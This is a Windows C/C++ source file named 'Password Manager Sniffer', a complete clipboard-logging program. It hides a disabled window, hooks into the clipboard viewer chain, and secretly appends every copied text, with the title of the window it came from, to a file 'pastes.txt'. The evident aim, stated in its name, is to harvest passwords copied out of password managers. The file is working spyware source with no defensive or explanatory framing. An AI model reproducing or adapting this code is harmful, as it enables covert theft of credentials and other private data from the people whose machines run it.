#include "stdafx.h"
#include "Password Manager Sniffer.h"

#define MAX_LOADSTRING 100

HINSTANCE hInst;
TCHAR szTitle[MAX_LOADSTRING];
TCHAR szWindowClass[MAX_LOADSTRING];

ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	MSG msg;
	HACCEL hAccelTable;

	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_PASSWORDMANAGERSNIFFER, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_PASSWORDMANAGERSNIFFER));

	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}

ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= NULL;
	wcex.hCursor		= NULL;
	wcex.hbrBackground	= NULL;
	wcex.lpszMenuName	= NULL;
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= NULL;

	return RegisterClassEx(&wcex);
}

BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance;

   hWnd = CreateWindow(szWindowClass, szTitle, WS_DISABLED, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }

   UpdateWindow(hWnd);

   return TRUE;
}

HWND hwndNextViewer;
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;

	switch (message)
	{
	case WM_COMMAND:
		return DefWindowProc(hWnd, message, wParam, lParam);
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);		
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		ChangeClipboardChain(hWnd, hwndNextViewer);
		PostQuitMessage(0);
		break;
	case WM_CREATE:
		hwndNextViewer = SetClipboardViewer(hWnd); 
		break;
	case WM_CHANGECBCHAIN: 
		if ((HWND) wParam == hwndNextViewer) 
			hwndNextViewer = (HWND) lParam; 
		else if (hwndNextViewer != NULL) 
			SendMessage(hwndNextViewer, message, wParam, lParam); 
		break;
	case WM_DRAWCLIPBOARD:
	case WM_CLIPBOARDUPDATE:	
		if(OpenClipboard(hWnd))
		{
			HGLOBAL hglb = GetClipboardData(CF_TEXT); 
			if (hglb != NULL) 
			{ 
				LPTSTR lptstr = (LPTSTR)GlobalLock(hglb); 
				if (lptstr != NULL) 
				{ 
					FILE * f = fopen("pastes.txt", "a");
					if(f != NULL)
					{
						char title[2048];
						memset(title, 0x00, 2048);
						HWND copyFrom = GetForegroundWindow();
						GetWindowText(copyFrom, title, 2048);
						fputs("(", f);
						if(title != NULL && strlen(title) != 0)
						{
							fputs(title, f);
						}
						fputs("):", f);
						fputs(lptstr, f);
						fputs("\n", f);
						fclose(f);
					}
					GlobalUnlock(hglb); 
				} 
			}
			CloseClipboard();
		}
        SendMessage(hwndNextViewer, message, wParam, lParam); 
        break; 
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}
